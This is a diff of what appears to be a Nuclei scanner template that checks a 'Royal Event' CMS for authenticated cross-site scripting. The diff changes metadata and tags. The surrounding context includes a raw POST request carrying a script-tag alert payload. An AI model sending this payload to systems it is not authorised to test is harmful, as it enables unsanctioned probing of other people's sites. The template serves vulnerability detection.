@@ -12,10 +12,11 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-80
   metadata:
     verified: true
-  tags: cms,royalevent,packetstorm,xss,authenticated
+    max-request: 2
+  tags: cms,royalevent,packetstorm,xss,authenticated,intrusive,vuln
 
 http:
   - raw:
@@ -37,7 +38,6 @@ http:
         Content-Disposition: form-data; name="login"
 
         ------WebKitFormBoundaryCSxQll1eihcqgIgD--
-
       - |
         POST /royal_event/btndates_report.php HTTP/1.1
         Host: {{Hostname}}
@@ -57,7 +57,6 @@ http:
         2022-06-22<script>alert(document.domain)</script>
         ------WebKitFormBoundaryFboH5ITu7DsGIGrD--
 
-    cookie-reuse: true
     matchers-condition: and
     matchers:
       - type: word
@@ -74,5 +73,4 @@ http:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/09/23
+# digest: 4a0a0047304502207949b51b674090ea7f58913df9eac54594b109d66f240e3e5e320e3e27e4bbf70221009b25e243cb74288630f4c3b02c166af5ded8eed9b9dc76fe0157865a9602ddb6:922c64590222798bb761d5b6d8e72950
